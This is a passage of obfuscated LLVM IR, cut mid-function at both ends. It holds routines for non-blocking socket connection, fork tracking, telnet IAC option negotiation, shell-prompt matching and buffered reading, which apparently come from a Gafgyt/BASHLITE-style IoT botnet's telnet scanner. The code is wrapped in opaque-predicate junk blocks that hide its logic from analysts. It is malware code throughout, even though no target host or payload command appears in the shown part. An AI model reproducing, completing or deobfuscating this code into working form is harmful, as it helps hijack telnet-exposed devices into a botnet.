  %196 = load i32, i32* %183, align 4
  %197 = call i32 (i32, i32, ...) @fcntl(i32 %196, i32 3, i8* null)
  %198 = sext i32 %197 to i64
  store i64 %198, i64* %192, align 8
  %199 = load i64, i64* %192, align 8
  %_ = sub i64 0, %199
  %gen = add i64 %_, 2048
  %_1 = sub i64 %199, 2048
  %gen2 = mul i64 %_1, 2048
  %_3 = sub i64 0, %199
  %gen4 = add i64 %_3, 2048
  %_5 = shl i64 %199, 2048
  %200 = or i64 %199, 2048
  store i64 %200, i64* %192, align 8
  %201 = load i32, i32* %183, align 4
  %202 = load i64, i64* %192, align 8
  %203 = call i32 (i32, i32, ...) @fcntl(i32 %201, i32 4, i64 %202)
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %187, i32 0, i32 0
  store i16 2, i16* %204, align 4
  %205 = load i32, i32* %185, align 4
  %206 = trunc i32 %205 to i16
  %207 = call zeroext i16 @htons(i16 zeroext %206) #13
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %187, i32 0, i32 1
  store i16 %207, i16* %208, align 2
  %209 = load i8*, i8** %184, align 8
  %210 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %187, i32 0, i32 2
  %211 = call i32 @getHost(i8* %209, %struct.in_addr* %210)
  %212 = icmp ne i32 %211, 0
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %52
  store i32 0, i32* %13, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %213 = load i32, i32* %14, align 4
  %_11 = sub i32 %213, 64
  %gen12 = mul i32 %_11, 64
  %_13 = shl i32 %213, 64
  %_14 = shl i32 %213, 64
  %_15 = sub i32 0, %213
  %gen16 = add i32 %_15, 64
  %_17 = sub i32 %213, 64
  %gen18 = mul i32 %_17, 64
  %_19 = sub i32 %213, 64
  %gen20 = mul i32 %_19, 64
  %_21 = sub i32 0, %213
  %gen22 = add i32 %_21, 64
  %214 = srem i32 %213, 64
  %215 = zext i32 %214 to i64
  %_23 = sub i64 1, %215
  %gen24 = mul i64 %_23, %215
  %_25 = sub i64 0, 1
  %gen26 = add i64 %_25, %215
  %_27 = shl i64 1, %215
  %_28 = shl i64 1, %215
  %_29 = sub i64 1, %215
  %gen30 = mul i64 %_29, %215
  %_31 = shl i64 1, %215
  %_32 = sub i64 1, %215
  %gen33 = mul i64 %_32, %215
  %_34 = shl i64 1, %215
  %216 = shl i64 1, %215
  %217 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %218 = load i32, i32* %14, align 4
  %_35 = shl i32 %218, 64
  %_36 = sub i32 %218, 64
  %gen37 = mul i32 %_36, 64
  %_38 = sub i32 %218, 64
  %gen39 = mul i32 %_38, 64
  %_40 = shl i32 %218, 64
  %_41 = shl i32 %218, 64
  %_42 = sub i32 0, %218
  %gen43 = add i32 %_42, 64
  %_44 = shl i32 %218, 64
  %219 = sdiv i32 %218, 64
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds [16 x i64], [16 x i64]* %217, i64 0, i64 %220
  %222 = load i64, i64* %221, align 8
  %_45 = sub i64 %222, %216
  %gen46 = mul i64 %_45, %216
  %_47 = sub i64 %222, %216
  %gen48 = mul i64 %_47, %216
  %_49 = sub i64 0, %222
  %gen50 = add i64 %_49, %216
  %_51 = sub i64 %222, %216
  %gen52 = mul i64 %_51, %216
  %223 = or i64 %222, %216
  store i64 %223, i64* %221, align 8
  %224 = load i32, i32* %14, align 4
  %_53 = shl i32 %224, 1
  %_54 = shl i32 %224, 1
  %_55 = sub i32 0, %224
  %gen56 = add i32 %_55, 1
  %_57 = sub i32 0, %224
  %gen58 = add i32 %_57, 1
  %_59 = sub i32 %224, 1
  %gen60 = mul i32 %_59, 1
  %_61 = shl i32 %224, 1
  %_62 = sub i32 0, %224
  %gen63 = add i32 %_62, 1
  %225 = add nsw i32 %224, 1
  %226 = call i32 @select(i32 %225, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  %227 = icmp sgt i32 %226, 0
  br label %originalBB10

originalBB67alteredBB:                            ; preds = %originalBB67, %133
  store i32 0, i32* %13, align 4
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %164
  %228 = load i32, i32* %13, align 4
  br label %originalBB71
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %79

; <label>:10:                                     ; preds = %0
  %11 = load i32, i32* @x.43
  %12 = load i32, i32* @y.44
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i64, i64* @numpids, align 8
  %20 = add i64 %19, 1
  store i64 %20, i64* @numpids, align 8
  %21 = load i64, i64* @numpids, align 8
  %22 = add i64 %21, 1
  %23 = mul i64 %22, 4
  %24 = call noalias i8* @malloc(i64 %23) #2
  %25 = bitcast i8* %24 to i32*
  store i32* %25, i32** %3, align 8
  store i32 0, i32* %4, align 4
  %26 = load i32, i32* @x.43
  %27 = load i32, i32* @y.44
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %66, %originalBBpart2
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %69

; <label>:40:                                     ; preds = %34
  %41 = load i32, i32* @x.43
  %42 = load i32, i32* @y.44
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %40
  %49 = load i32*, i32** @pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = zext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = load i32*, i32** %3, align 8
  %55 = load i32, i32* %4, align 4
  %56 = zext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  store i32 %53, i32* %57, align 4
  %58 = load i32, i32* @x.43
  %59 = load i32, i32* @y.44
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %66

; <label>:66:                                     ; preds = %originalBBpart217
  %67 = load i32, i32* %4, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %4, align 4
  br label %34

; <label>:69:                                     ; preds = %34
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #2
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %8
  %80 = load i32, i32* %1, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %10
  %81 = load i64, i64* @numpids, align 8
  %_ = sub i64 0, %81
  %gen = add i64 %_, 1
  %82 = add i64 %81, 1
  store i64 %82, i64* @numpids, align 8
  %83 = load i64, i64* @numpids, align 8
  %_1 = shl i64 %83, 1
  %_2 = sub i64 0, %83
  %gen3 = add i64 %_2, 1
  %_4 = sub i64 %83, 1
  %gen5 = mul i64 %_4, 1
  %_6 = shl i64 %83, 1
  %_7 = sub i64 %83, 1
  %gen8 = mul i64 %_7, 1
  %_9 = sub i64 0, %83
  %gen10 = add i64 %_9, 1
  %84 = add i64 %83, 1
  %_11 = shl i64 %84, 4
  %_12 = sub i64 0, %84
  %gen13 = add i64 %_12, 4
  %_14 = shl i64 %84, 4
  %85 = mul i64 %84, 4
  %86 = call noalias i8* @malloc(i64 %85) #2
  %87 = bitcast i8* %86 to i32*
  store i32* %87, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %originalBB

originalBB15alteredBB:                            ; preds = %originalBB15, %40
  %88 = load i32*, i32** @pids, align 8
  %89 = load i32, i32* %4, align 4
  %90 = zext i32 %89 to i64
  %91 = getelementptr inbounds i32, i32* %88, i64 %90
  %92 = load i32, i32* %91, align 4
  %93 = load i32*, i32** %3, align 8
  %94 = load i32, i32* %4, align 4
  %95 = zext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  store i32 %92, i32* %96, align 4
  br label %originalBB15
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %77 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %95

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %70

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  %54 = load i32, i32* @x.45
  %55 = load i32, i32* @y.46
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %53
  %62 = load i32, i32* @x.45
  %63 = load i32, i32* @y.46
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %70

; <label>:70:                                     ; preds = %originalBBpart2, %22
  %71 = load i32, i32* %5, align 4
  %72 = call i64 @send(i32 %71, i8* %8, i64 1, i32 16384)
  %73 = load i32, i32* %5, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = getelementptr inbounds i8, i8* %74, i64 2
  %76 = call i64 @send(i32 %73, i8* %75, i64 1, i32 16384)
  br label %78

; <label>:77:                                     ; preds = %3
  br label %78

; <label>:78:                                     ; preds = %77, %70
  %79 = load i32, i32* @x.45
  %80 = load i32, i32* @y.46
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %78
  store i32 0, i32* %4, align 4
  %87 = load i32, i32* @x.45
  %88 = load i32, i32* @y.46
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %95

; <label>:95:                                     ; preds = %originalBBpart24, %13
  %96 = load i32, i32* %4, align 4
  ret i32 %96

originalBBalteredBB:                              ; preds = %originalBB, %53
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %78
  store i32 0, i32* %4, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %originalBBpart239, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %196

; <label>:17:                                     ; preds = %11
  %18 = load i32, i32* @x.47
  %19 = load i32, i32* @y.48
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* @x.47
  %27 = load i32, i32* @y.48
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %34

; <label>:34:                                     ; preds = %138, %originalBBpart2
  %35 = load i32, i32* %5, align 4
  %36 = load i32, i32* %7, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %120

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* @x.47
  %40 = load i32, i32* @y.48
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i8*, i8** %3, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 0, %52
  %54 = getelementptr inbounds i8, i8* %50, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = icmp eq i32 %56, 0
  %58 = load i32, i32* @x.47
  %59 = load i32, i32* @y.48
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %118, label %66

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i8*, i8** %3, align 8
  %68 = load i32, i32* %5, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds i8, i8* %67, i64 %69
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = sub i64 0, %72
  %74 = getelementptr inbounds i8, i8* %70, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 32
  br i1 %77, label %118, label %78

; <label>:78:                                     ; preds = %66
  %79 = load i32, i32* @x.47
  %80 = load i32, i32* @y.48
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %78
  %87 = load i8*, i8** %3, align 8
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8, i8* %87, i64 %89
  %91 = load i32, i32* %7, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 0, %92
  %94 = getelementptr inbounds i8, i8* %90, i64 %93
  %95 = load i8, i8* %94, align 1
  %96 = sext i8 %95 to i32
  %97 = icmp eq i32 %96, 13
  %98 = load i32, i32* @x.47
  %99 = load i32, i32* @y.48
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart213, label %originalBB6alteredBB

originalBBpart213:                                ; preds = %originalBB6
  br i1 %97, label %118, label %106

; <label>:106:                                    ; preds = %originalBBpart213
  %107 = load i8*, i8** %3, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32, i32* %7, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 0, %112
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 10
  br label %118

; <label>:118:                                    ; preds = %106, %originalBBpart213, %66, %originalBBpart24
  %119 = phi i1 [ true, %originalBBpart213 ], [ true, %66 ], [ true, %originalBBpart24 ], [ %117, %106 ]
  br label %120

; <label>:120:                                    ; preds = %118, %34
  %121 = phi i1 [ false, %34 ], [ %119, %118 ]
  %122 = load i32, i32* @x.47
  %123 = load i32, i32* @y.48
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %120
  %130 = load i32, i32* @x.47
  %131 = load i32, i32* @y.48
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %121, label %138, label %141

; <label>:138:                                    ; preds = %originalBBpart217
  %139 = load i32, i32* %7, align 4
  %140 = add nsw i32 %139, 1
  store i32 %140, i32* %7, align 4
  br label %34

; <label>:141:                                    ; preds = %originalBBpart217
  %142 = load i32, i32* @x.47
  %143 = load i32, i32* @y.48
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %141
  %150 = load i8*, i8** %3, align 8
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds i8, i8* %150, i64 %152
  %154 = load i32, i32* %7, align 4
  %155 = sext i32 %154 to i64
  %156 = sub i64 0, %155
  %157 = getelementptr inbounds i8, i8* %153, i64 %156
  %158 = load i8, i8* %157, align 1
  %159 = sext i8 %158 to i32
  %160 = load i8*, i8** %4, align 8
  %161 = load i32, i32* %6, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = sext i8 %164 to i32
  %166 = icmp eq i32 %159, %165
  %167 = load i32, i32* @x.47
  %168 = load i32, i32* @y.48
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart227, label %originalBB19alteredBB

originalBBpart227:                                ; preds = %originalBB19
  br i1 %166, label %175, label %176

; <label>:175:                                    ; preds = %originalBBpart227
  store i32 1, i32* %2, align 4
  br label %197

; <label>:176:                                    ; preds = %originalBBpart227
  br label %177

; <label>:177:                                    ; preds = %176
  %178 = load i32, i32* @x.47
  %179 = load i32, i32* @y.48
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %177
  %186 = load i32, i32* %6, align 4
  %187 = add nsw i32 %186, 1
  store i32 %187, i32* %6, align 4
  %188 = load i32, i32* @x.47
  %189 = load i32, i32* @y.48
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart239, label %originalBB29alteredBB

originalBBpart239:                                ; preds = %originalBB29
  br label %11

; <label>:196:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %197

; <label>:197:                                    ; preds = %196, %175
  %198 = load i32, i32* @x.47
  %199 = load i32, i32* @y.48
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %197
  %206 = load i32, i32* %2, align 4
  %207 = load i32, i32* @x.47
  %208 = load i32, i32* @y.48
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  ret i32 %206

originalBBalteredBB:                              ; preds = %originalBB, %17
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %215 = load i8*, i8** %3, align 8
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds i8, i8* %215, i64 %217
  %219 = load i32, i32* %7, align 4
  %220 = sext i32 %219 to i64
  %_ = sub i64 0, %220
  %gen = mul i64 %_, %220
  %221 = sub i64 0, %220
  %222 = getelementptr inbounds i8, i8* %218, i64 %221
  %223 = load i8, i8* %222, align 1
  %224 = sext i8 %223 to i32
  %225 = icmp eq i32 %224, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %226 = load i8*, i8** %3, align 8
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8, i8* %226, i64 %228
  %230 = load i32, i32* %7, align 4
  %231 = sext i32 %230 to i64
  %_7 = sub i64 0, 0
  %gen8 = add i64 %_7, %231
  %_9 = shl i64 0, %231
  %_10 = sub i64 0, %231
  %gen11 = mul i64 %_10, %231
  %232 = sub i64 0, %231
  %233 = getelementptr inbounds i8, i8* %229, i64 %232
  %234 = load i8, i8* %233, align 1
  %235 = sext i8 %234 to i32
  %236 = icmp eq i32 %235, 13
  br label %originalBB6

originalBB15alteredBB:                            ; preds = %originalBB15, %120
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %141
  %237 = load i8*, i8** %3, align 8
  %238 = load i32, i32* %5, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds i8, i8* %237, i64 %239
  %241 = load i32, i32* %7, align 4
  %242 = sext i32 %241 to i64
  %_20 = shl i64 0, %242
  %_21 = sub i64 0, 0
  %gen22 = add i64 %_21, %242
  %_23 = sub i64 0, %242
  %gen24 = mul i64 %_23, %242
  %243 = sub i64 0, %242
  %244 = getelementptr inbounds i8, i8* %240, i64 %243
  %245 = load i8, i8* %244, align 1
  %246 = sext i8 %245 to i32
  %247 = load i8*, i8** %4, align 8
  %248 = load i32, i32* %6, align 4
  %249 = sext i32 %248 to i64
  %250 = getelementptr inbounds i8, i8* %247, i64 %249
  %251 = load i8, i8* %250, align 1
  %252 = sext i8 %251 to i32
  %253 = icmp eq i32 %246, %252
  br label %originalBB19

originalBB29alteredBB:                            ; preds = %originalBB29, %177
  %254 = load i32, i32* %6, align 4
  %_30 = sub i32 %254, 1
  %gen31 = mul i32 %_30, 1
  %_32 = sub i32 %254, 1
  %gen33 = mul i32 %_32, 1
  %_34 = sub i32 %254, 1
  %gen35 = mul i32 %_34, 1
  %_36 = shl i32 %254, 1
  %_37 = shl i32 %254, 1
  %255 = add nsw i32 %254, 1
  store i32 %255, i32* %6, align 4
  br label %originalBB29

originalBB41alteredBB:                            ; preds = %originalBB41, %197
  %256 = load i32, i32* %2, align 4
  br label %originalBB41
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = load i32, i32* @x.49
  %10 = load i32, i32* @y.50
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %struct.__sigset_t, align 8
  %30 = alloca %struct.timeval, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  store i32 %0, i32* %18, align 4
  store i8* %1, i8** %19, align 8
  store i32 %2, i32* %20, align 4
  store i32 %3, i32* %21, align 4
  store i32 %4, i32* %22, align 4
  store i8* %5, i8** %23, align 8
  store i32 %6, i32* %24, align 4
  store i32 %7, i32* %25, align 4
  %34 = load i32, i32* %25, align 4
  store i32 %34, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
